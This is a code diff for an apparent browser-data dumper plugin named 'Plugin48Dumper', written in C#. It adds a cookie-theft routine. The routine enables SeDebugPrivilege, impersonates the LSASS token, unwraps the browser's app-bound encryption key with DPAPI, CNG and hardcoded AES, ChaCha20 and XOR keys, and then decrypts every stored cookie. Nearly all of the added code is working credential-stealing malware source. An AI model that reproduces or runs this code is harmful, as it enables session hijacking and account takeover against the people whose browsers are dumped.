@@ -19,6 +19,8 @@ using System.Data.SQLite;
 using System.Text.RegularExpressions;
 using Org.BouncyCastle.Cms;
 using Newtonsoft.Json.Linq;
+using System.Runtime.Remoting.Messaging;
+using Plugin.Abstractions48;
 
 namespace Plugin48Dumper
 {
@@ -60,6 +62,13 @@ namespace Plugin48Dumper
             public string Password;
             public string szCreationDate;
             public string szLastUsed;
+        }
+
+        public class clsCookie
+        {
+            public string szHost { get; set; }
+            public string szName { get; set; }
+            public string szValue { get; set; }
         }
 
         public class clsHistory
@@ -305,7 +314,7 @@ namespace Plugin48Dumper
             return ls;
         }
 
-        public List<clsBookmark> fnlsBookmark(int nCount = 100)
+        public List<clsBookmark> fnlsDumpBookmark(int nCount = 100)
         {
             List<clsBookmark> ls = new List<clsBookmark>();
 
@@ -325,17 +334,263 @@ namespace Plugin48Dumper
             return ls;
         }
 
-        private bool fnbIsV10(byte[] data)
+        public List<clsCookie> fnlsDumpCookie(int nCount = 100, string szRegex = "")
         {
-            if (Encoding.UTF8.GetString(data.Take(3).ToArray()) == "v10")
+            List<clsCookie> ls = new List<clsCookie>();
+            string szLocalStateFilePath = LocalStateFile;
+            string szCookieFilePath = Path.Combine(DefaultDir, "Network", "Cookies");
+
+            if (!File.Exists(szLocalStateFilePath))
+                throw new Exception("File not found: " + szLocalStateFilePath);
+
+            if (!File.Exists(szCookieFilePath))
+                throw new Exception("File not found: " + szCookieFilePath);
+
+            string szTempLocalStatePath = fnNewTempFilePath();
+            string szTempCookiePath = fnNewTempFilePath();
+
+            File.Copy(szLocalStateFilePath, szTempLocalStatePath);
+            File.Copy(szCookieFilePath, szTempCookiePath);
+
+            if (!File.Exists(szTempLocalStatePath))
+                throw new Exception("Copy file failed: " + szLocalStateFilePath);
+
+            if (!File.Exists(szTempCookiePath))
+                throw new Exception("Copy file failed: " + szCookieFilePath);
+
+            dynamic objJson = JsonConvert.DeserializeObject(File.ReadAllText(szTempLocalStatePath));
+            string szKey = objJson.os_crypt.app_bound_encrypted_key;
+            byte[] abBoundKey = Convert.FromBase64String(szKey);
+            byte[] abApp = new byte[4];
+            Buffer.BlockCopy(abBoundKey, 0, abApp, 0, 4);
+            if (!string.Equals("APPB", Encoding.ASCII.GetString(abApp)))
+                throw new Exception("Invalid data: " + szKey);
+
+            byte[] abKey = abBoundKey.Skip(4).ToArray();
+
+            byte[] abKeyMachine = { };
+            using (new ImpersonateLsass())
             {
-                return true;
+                abKeyMachine = ProtectedData.Unprotect(abKey, null, DataProtectionScope.LocalMachine);
+            }
+
+            byte[] abKeyUser = ProtectedData.Unprotect(abKeyMachine, null, DataProtectionScope.CurrentUser);
+
+            var dicParsedData = fnParseKeyBlob(abKeyUser);
+            byte[] abV20MasterKey = fnDeriveV20MasterKey(dicParsedData);
+
+            string szConnStr = fnConnString(szTempCookiePath);
+            using (var conn = new SQLiteConnection(szConnStr))
+            {
+                conn.Open();
+                
+                using (var cmd = new SQLiteCommand(conn))
+                {
+                    string szQuery = $"" +
+                        $"SELECT host_key, " +
+                        $"name, " +
+                        $"CAST(encrypted_value AS BLOB) " +
+                        $"FROM cookies";
+
+                    cmd.CommandText = szQuery;
+
+                    using(var reader = cmd.ExecuteReader())
+                    {
+                        while (reader.Read())
+                        {
+                            byte[] abCipherCookie = (byte[])reader["encrypted_value"];
+
+                            byte[] abIV = (byte[])dicParsedData["iv"];
+                            byte[] abTag = (byte[])dicParsedData["tag"];
+                            clsTools.fnLogOK(fnDecryptV20(abV20MasterKey, abIV, abCipherCookie, abTag));
+                        }
+                    }
+                }
+            }
+
+            File.Delete(szTempLocalStatePath);
+            File.Delete(szTempCookiePath);
+
+            return ls;
+        }
+
+        private string fnDecryptV20(
+            byte[] masterKey,
+            byte[] iv,
+            byte[] ciphertext,
+            byte[] tag)
+        {
+            byte[] plain = AesGcmDecrypt(masterKey, iv, ciphertext, tag);
+            return Encoding.UTF8.GetString(plain);
+        }
+
+        public byte[] fnDeriveV20MasterKey(Dictionary<string, object> parsedData)
+        {
+            byte flag = (byte)parsedData["flag"];
+            byte[] iv = (byte[])parsedData["iv"];
+            byte[] ciphertext = (byte[])parsedData["ciphertext"];
+            byte[] tag = (byte[])parsedData["tag"];
+
+            if (flag == 1)
+            {
+                byte[] aesKey = HexToBytes(
+                    "B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787");
+
+                return AesGcmDecrypt(aesKey, iv, ciphertext, tag);
+            }
+            else if (flag == 2)
+            {
+                byte[] chachaKey = HexToBytes(
+                    "E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660");
+
+                return ChaCha20Poly1305Decrypt(chachaKey, iv, ciphertext, tag);
+            }
+            else if (flag == 3)
+            {
+                byte[] xorKey = HexToBytes(
+                    "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390");
+
+                byte[] encryptedAesKey = (byte[])parsedData["encrypted_aes_key"];
+
+                byte[] decryptedAesKey;
+                using (new ImpersonateLsass())
+                {
+                    decryptedAesKey = CngDecryptor.DecryptWithCng(encryptedAesKey);
+                }
+
+                if (decryptedAesKey.Length < 32)
+                    throw new CryptographicException("Invalid decrypted AES key length");
+
+                byte[] aesKey = decryptedAesKey.Take(32).ToArray();
+                byte[] finalKey = ByteXor(aesKey, xorKey);
+
+                return AesGcmDecrypt(finalKey, iv, ciphertext, tag);
             }
             else
             {
-                return false;
+                throw new NotSupportedException($"Unsupported flag: {flag}");
             }
         }
+
+        private byte[] AesGcmDecrypt(
+            byte[] key,
+            byte[] iv,
+            byte[] ciphertext,
+            byte[] tag)
+        {
+            var cipher = new GcmBlockCipher(new AesEngine());
+            var parameters = new AeadParameters(
+                new KeyParameter(key),
+                128,   // tag bits
+                iv
+            );
+
+            cipher.Init(false, parameters);
+
+            byte[] combined = new byte[ciphertext.Length + tag.Length];
+            Buffer.BlockCopy(ciphertext, 0, combined, 0, ciphertext.Length);
+            Buffer.BlockCopy(tag, 0, combined, ciphertext.Length, tag.Length);
+
+            byte[] output = new byte[cipher.GetOutputSize(combined.Length)];
+            int len = cipher.ProcessBytes(combined, 0, combined.Length, output, 0);
+            cipher.DoFinal(output, len);
+
+            return output;
+        }
+
+        private byte[] ChaCha20Poly1305Decrypt(
+            byte[] key,
+            byte[] iv,
+            byte[] ciphertext,
+            byte[] tag)
+        {
+            var cipher = new ChaCha20Poly1305();
+            var parameters = new AeadParameters(
+                new KeyParameter(key),
+                128,
+                iv
+            );
+
+            cipher.Init(false, parameters);
+
+            byte[] combined = new byte[ciphertext.Length + tag.Length];
+            Buffer.BlockCopy(ciphertext, 0, combined, 0, ciphertext.Length);
+            Buffer.BlockCopy(tag, 0, combined, ciphertext.Length, tag.Length);
+
+            byte[] output = new byte[cipher.GetOutputSize(combined.Length)];
+            int len = cipher.ProcessBytes(combined, 0, combined.Length, output, 0);
+            cipher.DoFinal(output, len);
+
+            return output;
+        }
+
+        private static byte[] ByteXor(byte[] a, byte[] b)
+        {
+            byte[] result = new byte[a.Length];
+            for (int i = 0; i < a.Length; i++)
+                result[i] = (byte)(a[i] ^ b[i]);
+            return result;
+        }
+
+        private static byte[] HexToBytes(string hex)
+        {
+            int len = hex.Length / 2;
+            byte[] data = new byte[len];
+            for (int i = 0; i < len; i++)
+                data[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
+            return data;
+        }
+
+        public Dictionary<string, object> fnParseKeyBlob(byte[] blobData)
+        {
+            var parsedData = new Dictionary<string, object>();
+
+            using (var ms = new MemoryStream(blobData))
+            using (var br = new BinaryReader(ms))
+            {
+                //header_len (uint32, little-endian)
+                uint headerLen = br.ReadUInt32();
+                parsedData["header"] = br.ReadBytes((int)headerLen);
+
+                // content_len (uint32, little-endian)
+                uint contentLen = br.ReadUInt32();
+
+                // assert header_len + content_len + 8 == len(blob_data)
+                if (headerLen + contentLen + 8 != blobData.Length)
+                    throw new InvalidDataException("Invalid blob length");
+
+                // flag (1 byte)
+                byte flag = br.ReadByte();
+                parsedData["flag"] = flag;
+
+                if (flag == 1 || flag == 2)
+                {
+                    // [flag|iv|ciphertext|tag]
+                    // [1|12|32|16]
+                    parsedData["iv"] = br.ReadBytes(12);
+                    parsedData["ciphertext"] = br.ReadBytes(32);
+                    parsedData["tag"] = br.ReadBytes(16);
+                }
+                else if (flag == 3)
+                {
+                    // [flag|encrypted_aes_key|iv|ciphertext|tag]
+                    // [1|32|12|32|16]
+                    parsedData["encrypted_aes_key"] = br.ReadBytes(32);
+                    parsedData["iv"] = br.ReadBytes(12);
+                    parsedData["ciphertext"] = br.ReadBytes(32);
+                    parsedData["tag"] = br.ReadBytes(16);
+                }
+                else
+                {
+                    throw new NotSupportedException($"Unsupported flag: {flag}");
+                }
+            }
+
+            return parsedData;
+        }
+
+        private bool fnbIsV10(byte[] abData) => string.Equals("v10", Encoding.UTF8.GetString(abData.Take(3).ToArray()));
+        private bool fnbIsV20(byte[] abData) => string.Equals("v20", Encoding.UTF8.GetString(abData.Take(3).ToArray()));
 
         private void fnPrepare(byte[] encryptedData, out byte[] nonce, out byte[] ciphertextTag)
         {
@@ -367,14 +622,6 @@ namespace Plugin48Dumper
             }
 
             return sR;
-        }
-
-        public List<clsBookmark> fnlsDumpBookMark(int nCount = 100)
-        {
-            List<clsBookmark> ls = new List<clsBookmark>();
-
-
-            return ls;
         }
 
         private void fnParseNode(JToken node, string szCurrentPath, List<clsBookmark> output)
@@ -608,6 +855,239 @@ namespace Plugin48Dumper
                     EncryptedKey = szKey;
                 }
             }
+        }
+
+        public sealed class ImpersonateLsass : IDisposable
+        {
+            private WindowsImpersonationContext _context;
+            private IntPtr _duplicatedToken = IntPtr.Zero;
+
+            public ImpersonateLsass()
+            {
+                EnableSeDebugPrivilege();
+
+                Process lsass = Process.GetProcessesByName("lsass").First();
+
+                IntPtr processHandle = OpenProcess(
+                    ProcessAccessFlags.QueryInformation,
+                    false,
+                    lsass.Id);
+
+                if (!OpenProcessToken(
+                    processHandle,
+                    TokenAccessLevels.Duplicate | TokenAccessLevels.Query,
+                    out IntPtr lsassToken))
+                    throw new Exception("OpenProcessToken failed");
+
+                if (!DuplicateTokenEx(
+                    lsassToken,
+                    TokenAccessLevels.Impersonate | TokenAccessLevels.Query,
+                    IntPtr.Zero,
+                    SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
+                    TOKEN_TYPE.TokenImpersonation,
+                    out _duplicatedToken))
+                    throw new Exception("DuplicateTokenEx failed");
+
+                var identity = new WindowsIdentity(_duplicatedToken);
+                _context = identity.Impersonate();
+            }
+
+            public void Dispose()
+            {
+                _context?.Undo();
+                if (_duplicatedToken != IntPtr.Zero)
+                    CloseHandle(_duplicatedToken);
+            }
+
+            // ---------------- native ----------------
+
+            private static void EnableSeDebugPrivilege()
+            {
+                using (var identity = WindowsIdentity.GetCurrent(TokenAccessLevels.AdjustPrivileges))
+                {
+                    var token = identity.Token;
+                    LUID luid;
+                    LookupPrivilegeValue(null, "SeDebugPrivilege", out luid);
+
+                    TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
+                    {
+                        PrivilegeCount = 1,
+                        Privileges = new LUID_AND_ATTRIBUTES[]
+                        {
+                    new LUID_AND_ATTRIBUTES
+                    {
+                        Luid = luid,
+                        Attributes = 0x2 // SE_PRIVILEGE_ENABLED
+                    }
+                        }
+                    };
+
+                    AdjustTokenPrivileges(token, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
+                }
+            }
+
+            // ---------------- P/Invoke ----------------
+
+            [DllImport("advapi32.dll", SetLastError = true)]
+            static extern bool OpenProcessToken(
+                IntPtr ProcessHandle,
+                TokenAccessLevels DesiredAccess,
+                out IntPtr TokenHandle);
+
+            [DllImport("advapi32.dll", SetLastError = true)]
+            static extern bool DuplicateTokenEx(
+                IntPtr hExistingToken,
+                TokenAccessLevels dwDesiredAccess,
+                IntPtr lpTokenAttributes,
+                SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
+                TOKEN_TYPE TokenType,
+                out IntPtr phNewToken);
+
+            [DllImport("advapi32.dll", SetLastError = true)]
+            static extern bool LookupPrivilegeValue(
+                string lpSystemName,
+                string lpName,
+                out LUID lpLuid);
+
+            [DllImport("advapi32.dll", SetLastError = true)]
+            static extern bool AdjustTokenPrivileges(
+                IntPtr TokenHandle,
+                bool DisableAllPrivileges,
+                ref TOKEN_PRIVILEGES NewState,
+                int BufferLength,
+                IntPtr PreviousState,
+                IntPtr ReturnLength);
+
+            [DllImport("kernel32.dll")]
+            static extern IntPtr OpenProcess(
+                ProcessAccessFlags dwDesiredAccess,
+                bool bInheritHandle,
+                int dwProcessId);
+
+            [DllImport("kernel32.dll")]
+            static extern bool CloseHandle(IntPtr hObject);
+
+            // ---------------- structs ----------------
+
+            enum TOKEN_TYPE { TokenPrimary = 1, TokenImpersonation }
+            enum SECURITY_IMPERSONATION_LEVEL { SecurityImpersonation = 2 }
+
+            [StructLayout(LayoutKind.Sequential)]
+            struct LUID { public uint LowPart; public int HighPart; }
+
+            [StructLayout(LayoutKind.Sequential)]
+            struct LUID_AND_ATTRIBUTES
+            {
+                public LUID Luid;
+                public uint Attributes;
+            }
+
+            [StructLayout(LayoutKind.Sequential)]
+            struct TOKEN_PRIVILEGES
+            {
+                public int PrivilegeCount;
+                public LUID_AND_ATTRIBUTES[] Privileges;
+            }
+
+            enum ProcessAccessFlags : uint
+            {
+                QueryInformation = 0x0400
+            }
+        }
+
+        public static class CngDecryptor
+        {
+            private const int NCRYPT_SILENT_FLAG = 0x40;
+
+            public static byte[] DecryptWithCng(byte[] input)
+            {
+                IntPtr hProvider;
+                int status = NCryptOpenStorageProvider(
+                    out hProvider,
+                    "Microsoft Software Key Storage Provider",
+                    0);
+
+                if (status != 0)
+                    throw new Exception($"NCryptOpenStorageProvider failed: {status}");
+
+                IntPtr hKey;
+                status = NCryptOpenKey(
+                    hProvider,
+                    out hKey,
+                    "Google Chromekey1",
+                    0,
+                    0);
+
+                if (status != 0)
+                    throw new Exception($"NCryptOpenKey failed: {status}");
+
+                int pcbResult = 0;
+
+                // First call: query size
+                status = NCryptDecrypt(
+                    hKey,
+                    input,
+                    input.Length,
+                    IntPtr.Zero,
+                    null,
+                    0,
+                    ref pcbResult,
+                    NCRYPT_SILENT_FLAG);
+
+                if (status != 0)
+                    throw new Exception($"NCryptDecrypt (size) failed: {status}");
+
+                byte[] output = new byte[pcbResult];
+
+                // Second call: actual decrypt
+                status = NCryptDecrypt(
+                    hKey,
+                    input,
+                    input.Length,
+                    IntPtr.Zero,
+                    output,
+                    output.Length,
+                    ref pcbResult,
+                    NCRYPT_SILENT_FLAG);
+
+                if (status != 0)
+                    throw new Exception($"NCryptDecrypt failed: {status}");
+
+                NCryptFreeObject(hKey);
+                NCryptFreeObject(hProvider);
+
+                return output;
+            }
+
+            // ---------------- P/Invoke ----------------
+
+            [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
+            static extern int NCryptOpenStorageProvider(
+                out IntPtr phProvider,
+                string pszProviderName,
+                int dwFlags);
+
+            [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
+            static extern int NCryptOpenKey(
+                IntPtr hProvider,
+                out IntPtr phKey,
+                string pszKeyName,
+                int dwLegacyKeySpec,
+                int dwFlags);
+
+            [DllImport("ncrypt.dll")]
+            static extern int NCryptDecrypt(
+                IntPtr hKey,
+                byte[] pbInput,
+                int cbInput,
+                IntPtr pPaddingInfo,
+                byte[] pbOutput,
+                int cbOutput,
+                ref int pcbResult,
+                int dwFlags);
+
+            [DllImport("ncrypt.dll")]
+            static extern int NCryptFreeObject(IntPtr hObject);
         }
     }
 }
